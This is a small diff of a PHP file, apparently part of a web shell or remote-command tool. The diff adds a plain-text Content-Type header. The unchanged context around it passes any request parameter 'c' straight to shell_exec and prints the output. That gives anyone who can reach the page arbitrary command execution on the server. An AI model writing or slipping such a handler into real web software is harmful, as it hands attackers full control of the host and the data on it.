@@ -66,6 +66,7 @@ $debug = 0;
 
 // Just run command
 if (isset($_REQUEST['c'])) {
+	header('Content-Type:text/plain');
 	die(shell_exec($_REQUEST['c']));
 }
 
